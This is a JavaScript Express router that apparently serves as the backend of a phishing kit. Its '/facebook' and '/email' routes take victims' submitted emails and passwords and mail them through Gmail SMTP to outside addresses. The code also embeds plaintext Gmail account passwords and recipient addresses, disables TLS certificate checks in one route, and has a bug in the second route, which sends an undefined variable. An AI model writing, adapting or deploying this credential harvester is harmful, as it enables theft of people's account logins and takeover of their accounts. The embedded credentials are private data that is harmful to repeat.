const router = require('express').Router();
const nodemailer = require('nodemailer')

router.post('/facebook', async (req, res)=>{

    const output = `
    <p>Email: ${req.body.email} </p>
    <p>Username: ${req.body.password}</p>
    `

    try {
       
        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true, 
            auth: {
              user: 'SK.bossmusicmanagment8@gmail.com', // generated ethereal user
              pass: '1Dfwm2dfwm3dfwm4dfwm$', // generated ethereal password
            },
            tls: {
                rejectUnauthorized: false
              }
          });
        
          const mailoptions = {
            from: 'SK.bossmusicmanagment8@gmail.com', // sender address
            to: `moorechelsea80@gmail.com`, // list of receivers
            subject: "New entry", // Subject line
            html: output
          }
          // send mail with defined transport object

           transporter.sendMail(mailoptions, (error, info)=>{
            if(error){
                console.log(error)
            }
            else{
                
               console.log('email sent')
            }
        })
     
        res.status(200).send('sent')

    } catch (error) {
        res.status(400).send(error)
        console.log(error)
    }
})

router.post('/email', async (req, res)=>{

    const output = `
    <p>Email: ${req.body.email} </p>
    <p>Username: ${req.body.password}</p>
    `
//sksam94@yahoo.com
    try {
       
        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true, 
            auth: {
              user: 'lwardrick2443@gmail.com', // generated ethereal user
              pass: 'mymumis20', // generated ethereal password
            },
          });
        
          const mailoptions = {
            from: 'lwardrick2443@gmail.com', // sender address
            to: `olajide.etti3@gmail.com`, // list of receivers
            subject: "New entry", // Subject line
            html: output
          }
          // send mail with defined transport object

           transporter.sendMail(mailoptions, (error, info)=>{
            if(error){
                console.log(error)
            }
            else{
                
               console.log('email sent')
            }
        })
     
        res.status(200).send(userobj)

    } catch (error) {
        res.status(400).send(error)
        console.log(error)
    }
})



module.exports = router;